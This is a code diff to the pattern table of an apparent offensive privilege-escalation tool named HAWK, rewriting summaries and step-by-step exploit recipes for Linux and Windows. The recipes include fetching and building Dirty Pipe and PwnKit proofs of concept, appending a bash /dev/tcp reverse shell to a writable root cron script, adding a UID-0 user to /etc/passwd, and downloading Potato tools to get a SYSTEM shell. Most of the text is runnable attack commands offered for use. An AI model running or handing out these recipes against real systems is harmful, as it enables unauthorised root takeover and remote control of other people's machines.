@@ -224,10 +224,11 @@ PATTERNS: list[dict[str, Any]] = [
             ]},
         ],
         "summary": (
-            "Members of `lxd` (or `lxc`) can launch a privileged "
-            "container with the host root filesystem mounted at "
-            "/mnt/root → instant root.  Works with any image "
-            "(usually pull a tiny alpine image from images:)."
+            "Members of `lxd`/`lxc` can launch a PRIVILEGED container "
+            "with the whole host filesystem mounted inside it at "
+            "/mnt/root.  Inside that container you are root, so every "
+            "host file is read/write -> equivalent to root on the host.  "
+            "Any image works (usually a tiny alpine)."
         ),
         "exploit": [
             "# Bootstrap lxd if first time (skip if `lxc list` already works):",
@@ -263,10 +264,11 @@ PATTERNS: list[dict[str, Any]] = [
             ]},
         ],
         "summary": (
-            "Members of `disk` can read/write raw block devices "
-            "(/dev/sda etc.).  You can debugfs the rootfs directly "
-            "to grep /etc/shadow without any system call going "
-            "through normal POSIX permissions."
+            "Members of `disk` can read and write raw block devices "
+            "(/dev/sda...).  With debugfs you read the rootfs directly "
+            "-- bypassing POSIX permissions -- to pull /etc/shadow or "
+            "root's SSH keys, or write a key into root's "
+            "authorized_keys for a root login."
         ),
         "exploit": [
             "# Identify the rootfs block device:",
@@ -300,9 +302,10 @@ PATTERNS: list[dict[str, Any]] = [
             ]},
         ],
         "summary": (
-            "Members of `shadow` can read /etc/shadow.  Crack the "
-            "hashes offline with john + rockyou; if root or any "
-            "sudoer has a weak password you've got root."
+            "Members of `shadow` can read /etc/shadow.  Dump it, crack "
+            "the hashes offline with john + rockyou -- if root or any "
+            "sudoer has a weak password, that password is your way in "
+            "(su / sudo -> root)."
         ),
         "exploit": [
             "cat /etc/shadow > /tmp/.s",
@@ -329,11 +332,11 @@ PATTERNS: list[dict[str, Any]] = [
             {"desc_substr": ["nopasswd:", "(all : all) nopasswd"]},
         ],
         "summary": (
-            "`sudo -l` showed at least one NOPASSWD entry.  Every "
-            "binary on that list is a candidate for direct root: "
-            "even seemingly-innocent binaries (find, vim, less, "
-            "tar, awk, env, tee, dd, systemctl, …) are root-as-a-"
-            "service if you check gtfobins."
+            "`sudo -l` showed at least one NOPASSWD entry -- you can "
+            "run that binary as root without a password.  Almost any "
+            "binary is a root shell if you know its gtfobins trick "
+            "(find, vim, less, tar, awk, env, tee, dd, systemctl, ...): "
+            "look yours up and run the SUDO variant of the escape."
         ),
         "exploit": [
             "# Re-run sudo -l to copy the exact rule:",
@@ -420,11 +423,11 @@ PATTERNS: list[dict[str, Any]] = [
             {"title_substr": ["dangerous capabilit"]},
         ],
         "summary": (
-            "A binary has dangerous Linux capabilities — most "
-            "commonly cap_setuid (= become any UID without SUID) "
-            "or cap_dac_read_search (= read any file regardless "
-            "of permissions).  python/perl/ruby/php with "
-            "cap_setuid+ep are direct root."
+            "A binary carries a dangerous Linux capability.  "
+            "cap_setuid+ep = become any UID (incl. 0) -> python/perl/"
+            "ruby with it are a direct root shell.  cap_dac_read_search "
+            "= read any file regardless of permissions (e.g. "
+            "/etc/shadow).  Use the recipe for the capability HAWK flagged."
         ),
         "exploit": [
             "# Re-run getcap to confirm the binary:",
@@ -463,21 +466,28 @@ PATTERNS: list[dict[str, Any]] = [
             {"kernel_lt": (5, 16, 11), "kernel_ge": (5, 8, 0)},
         ],
         "summary": (
-            "Kernel between 5.8 and 5.16.11 (or unpatched 5.10/"
-            "5.15 LTS) is vulnerable to CVE-2022-0847 (Dirty Pipe). "
-            "Lets unprivileged users overwrite parts of read-only "
-            "files — classic root path is to inject into "
-            "/etc/passwd or a SUID binary."
+            "Kernel 5.8 through 5.16.11 (or an unpatched 5.10/5.15 "
+            "LTS) is vulnerable to CVE-2022-0847 (Dirty Pipe): an "
+            "unprivileged user can overwrite bytes in files they can "
+            "only read.  Aim the PoC at a root-owned SUID binary and "
+            "it drops you a root shell.  Build on Kali, copy to the "
+            "target, run it there."
         ),
         "exploit": [
-            "# Check kernel:",
+            "# 1. Confirm the running kernel is in range (5.8 up to <5.16.11):",
             "uname -r",
             "",
-            "# Reference PoC: https://haxx.in/files/dirtypipez.c",
-            "# Build on Kali, push to target, run against a SUID binary:",
+            "# 2. Fetch + build the PoC ON KALI, then copy /tmp/dp onto the target.",
+            "#    Reference PoC: https://haxx.in/files/dirtypipez.c",
             "wget https://haxx.in/files/dirtypipez.c -O /tmp/dp.c",
             "gcc /tmp/dp.c -o /tmp/dp",
+            "",
+            "# 3. Point it at a root-owned SUID binary -> spawns a root shell.",
+            "#    DESTRUCTIVE: it rewrites bytes in the SUID binary (the PoC restores",
+            "#    them, but back /usr/bin/sudo up first in case it aborts mid-run).",
             "/tmp/dp /usr/bin/sudo   # hijacks the SUID binary",
+            "",
+            "# verify:  id",
         ],
         "refs": [
             "https://dirtypipe.cm4all.com/",
@@ -500,19 +510,24 @@ PATTERNS: list[dict[str, Any]] = [
             {"title_substr": ["pkexec present", "pwnkit"]},
         ],
         "summary": (
-            "If /usr/bin/pkexec exists and polkit < 0.120 (most "
-            "boxes pre-2022), CVE-2021-4034 (PwnKit) gives root "
-            "in seconds.  Heap layout exploit, no kernel touch — "
-            "extremely reliable."
+            "If /usr/bin/pkexec exists and polkit is older than 0.120 "
+            "(most boxes before 2022), CVE-2021-4034 (PwnKit) turns "
+            "pkexec into an instant root shell.  A userland argv/heap "
+            "exploit with no kernel involvement, so it's extremely "
+            "reliable.  Build it, run it, land as root."
         ),
         "exploit": [
-            "# Quick check:",
-            "ls -l /usr/bin/pkexec     # should be SUID",
+            "# 1. Confirm pkexec is present and SUID-root (the exploit needs the setuid bit):",
+            "ls -l /usr/bin/pkexec     # should be SUID (rws)",
             "",
-            "# Reference PoC: https://github.com/ly4k/PwnKit",
+            "# 2. Fetch + build the PoC (reference: https://github.com/ly4k/PwnKit):",
             "wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c -O /tmp/pk.c",
             "gcc /tmp/pk.c -o /tmp/pk",
+            "",
+            "# 3. Run it -> drops you straight into a root shell:",
             "/tmp/pk",
+            "",
+            "# verify:  id",
         ],
         "refs": [
             "https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/"
@@ -535,17 +550,20 @@ PATTERNS: list[dict[str, Any]] = [
                               "sudo 1.9.0"]},
         ],
         "summary": (
-            "sudo < 1.9.5p2 is vulnerable to a heap overflow in "
-            "sudoedit (CVE-2021-3156, Baron Samedit).  Works "
-            "without any sudo rule for the user — pure local "
-            "memory corruption."
+            "sudo older than 1.9.5p2 has a heap buffer overflow in "
+            "sudoedit (CVE-2021-3156, Baron Samedit).  Any local user "
+            "can trigger it to get root -- no sudo rule and no password "
+            "needed.  The offsets are distro/glibc-specific, so build "
+            "the PoC on a matching host and push the binary over."
         ),
         "exploit": [
+            "# 1. Confirm the sudo version is < 1.9.5p2:",
             "sudo --version | head -1",
             "",
-            "# Reference PoC: https://github.com/blasty/CVE-2021-3156",
-            "# Build on a host matching the target distro & glibc,",
-            "# then push the binary to the target.",
+            "# 2. Build the PoC on a host matching the target's distro & glibc",
+            "#    (the offsets are version-specific), then push the binary to the",
+            "#    target and run it there -> root shell (verify with:  id).",
+            "#    Reference PoC: https://github.com/blasty/CVE-2021-3156",
         ],
         "refs": [
             "https://nvd.nist.gov/vuln/detail/CVE-2021-3156",
@@ -565,18 +583,23 @@ PATTERNS: list[dict[str, Any]] = [
             {"desc_substr": ["* * * * * root", "/etc/cron.d/", "/etc/cron.hourly/"]},
         ],
         "summary": (
-            "Found a cron task running as root that references a "
-            "writable script or path.  Append your reverse-shell "
-            "command to the script and wait for the next tick."
+            "A cron job runs as root but executes a script (or a path) "
+            "you can write to.  Append a reverse-shell one-liner to that "
+            "script; on the next tick root runs it and connects back to "
+            "your listener -> root shell."
         ),
         "exploit": [
-            "# Identify the cron + the script path:",
+            "# 1. Find the root cron and the script/path it runs (look for a",
+            "#    '* * * * * root ...' line pointing at a writable script):",
             "cat /etc/crontab; ls -la /etc/cron.*",
             "",
-            "# If the script is world-writable, append a reverse shell:",
+            "# 2. On Kali (your box) start a listener to catch the callback:",
+            "#      nc -lvnp 4444",
+            "",
+            "# 3. Append a reverse shell to the writable script (root runs it next tick):",
             "echo 'bash -c \"bash -i >& /dev/tcp/{target_ip}/4444 0>&1\"' >> /path/to/script.sh",
             "",
-            "# On Kali: nc -lvnp 4444   (then wait)",
+            "# verify: wait one tick -> your Kali listener drops a root shell (type  id)",
         ],
         "refs": [
             "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
@@ -599,21 +622,25 @@ PATTERNS: list[dict[str, Any]] = [
                               "/etc/passwd is world-writable"]},
         ],
         "summary": (
-            "/etc/passwd is world-writable.  Add a UID-0 user with "
-            "a known password and `su` to it — works even with no "
-            "shadow access because passwd-style hashes still take "
-            "precedence when the second field is non-empty."
+            "/etc/passwd is world-writable.  Add your own UID-0 "
+            "(root-equivalent) user with a password hash you control, "
+            "then `su` to it -> root shell.  Works with no /etc/shadow "
+            "access: a non-empty hash in the second field of "
+            "/etc/passwd is still honored, overriding /etc/shadow."
         ),
         "exploit": [
-            "# Generate a hash for password 'pwn':",
-            "openssl passwd pwn   # outputs $1$xx$...",
+            "# 1. Make an MD5crypt hash for a password you pick (here: pwn):",
+            "openssl passwd -1 -salt xx pwn   # -> $1$xx$HASH  (paste the HASH below)",
+            "#    NOTE: plain 'openssl passwd pwn' gives a DES hash, NOT the $1$ the",
+            "#    line below expects — the -1 (MD5) is required.",
             "",
-            "# Append a root-equivalent line:",
+            "# 2. Append a UID-0 user (replace YOURHASH with the hash from step 1).",
+            "#    DESTRUCTIVE: back /etc/passwd up first ->  cp /etc/passwd /tmp/passwd.bak",
             "echo 'pwn:$1$xx$YOURHASH:0:0:root:/root:/bin/bash' >> /etc/passwd",
             "",
-            "# Become root:",
+            "# 3. Switch to the new user (password: pwn) -> root shell:",
             "su pwn",
-            "id   # uid=0(root)",
+            "id   # verify: uid=0(root)",
         ],
         "refs": [
             "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
@@ -636,11 +663,13 @@ PATTERNS: list[dict[str, Any]] = [
                               "seassignprimarytokenprivilege"]},
         ],
         "summary": (
-            "Current token has SeImpersonate or "
-            "SeAssignPrimaryToken — the canonical Windows service "
-            "account privilege.  Any of the Potato family "
-            "(JuicyPotato pre-2019, PrintSpoofer, RoguePotato, "
-            "GodPotato latest) trades it for a SYSTEM shell."
+            "Your token holds SeImpersonate or SeAssignPrimaryToken "
+            "-- the privilege Windows service accounts (IIS, MSSQL, "
+            "...) carry.  Hand it to any Potato-family tool and you "
+            "trade it for a full SYSTEM shell.  Pick the variant for "
+            "the build: GodPotato (Win 8 -> Server 2022), PrintSpoofer "
+            "(Win 10 / Server 2019), JuicyPotato (pre-2019), "
+            "RoguePotato (when a remote COM port is reachable)."
         ),
         "exploit": [  # cmd.exe-style (legacy reverse shells)
             ":: Confirm SeImpersonate / SeAssignPrimaryToken Enabled:",
@@ -658,14 +687,16 @@ PATTERNS: list[dict[str, Any]] = [
             "# Confirm SeImpersonate / SeAssignPrimaryToken Enabled:",
             "whoami /priv | Select-String 'SeImpersonate','SeAssignPrimaryToken'",
             "",
-            "# Drop GodPotato to disk (.NET 4+ on target required):",
+            "# Fetch GodPotato from your Kali HTTP server to %TEMP% (.NET 4+ on target),",
+            "# then run it -- the -cmd payload executes as SYSTEM:",
             "$wc = New-Object Net.WebClient",
             "$wc.DownloadFile('http://{target_ip}:8000/GodPotato.exe', \"$env:TEMP\\gp.exe\")",
-            "& \"$env:TEMP\\gp.exe\" -cmd \"powershell -ep bypass -c whoami\"",
+            "& \"$env:TEMP\\gp.exe\" -cmd \"powershell -ep bypass -c whoami\"   # -> nt authority\\system",
             "",
-            "# In-memory PrintSpoofer (no disk touch — needs amsi already bypassed):",
-            "$dll = (New-Object Net.WebClient).DownloadData('http://{target_ip}:8000/PrintSpoofer.dll')",
-            "[Reflection.Assembly]::Load($dll); [PrintSpoofer.Program]::Main(@('-i','-c','powershell'))",
+            "# PrintSpoofer is a NATIVE exe (not a .NET assembly) -- fetch and run it,",
+            "# don't try to reflectively load it:",
+            "$wc.DownloadFile('http://{target_ip}:8000/PrintSpoofer.exe', \"$env:TEMP\\ps.exe\")",
+            "& \"$env:TEMP\\ps.exe\" -i -c powershell",
             "",
             "# Or use HAWK's POTATO picker — it grabs the right exe based on OS fingerprint.",
         ],
@@ -686,9 +717,11 @@ PATTERNS: list[dict[str, Any]] = [
             {"title_substr": ["alwaysinstallelevated"]},
         ],
         "summary": (
-            "Both HKLM and HKCU AlwaysInstallElevated == 1.  Any "
-            ".msi run with msiexec runs as SYSTEM — pure-MSI privesc, "
-            "no exploit binary needed."
+            "Both the HKLM and HKCU AlwaysInstallElevated keys are 1, "
+            "so Windows installs any .msi with SYSTEM rights no matter "
+            "who launches it.  Build a payload .msi, run it with "
+            "msiexec, and it fires as SYSTEM -- no exploit binary "
+            "needed.  BOTH keys must be 1; one alone does nothing."
         ),
         "exploit": [
             ":: Confirm both keys are 0x1:",
@@ -734,13 +767,13 @@ PATTERNS: list[dict[str, Any]] = [
                               "unquoted service paths"]},
         ],
         "summary": (
-            "A service runs from an unquoted path containing a "
-            "space (C:\\Program Files\\...).  If you can write to "
-            "any earlier path component, drop a binary there — "
-            "Windows tries each before quoting and runs yours.  "
-            "After service restart (or `sc start`), your binary "
-            "executes with the service account's privileges — "
-            "usually LocalSystem."
+            "A service's ImagePath is unquoted and contains a space "
+            "(e.g. C:\\Program Files\\Vendor\\Tool\\bin.exe).  Windows "
+            "tries each space-delimited prefix as an executable before "
+            "falling through, so if you can write to an earlier path "
+            "component you plant your own binary there.  On the next "
+            "start (sc start / reboot) Windows runs it as the service "
+            "account -- usually LocalSystem."
         ),
         "exploit": [
             ":: Confirm the unquoted paths (modern, no wmic dependency):",
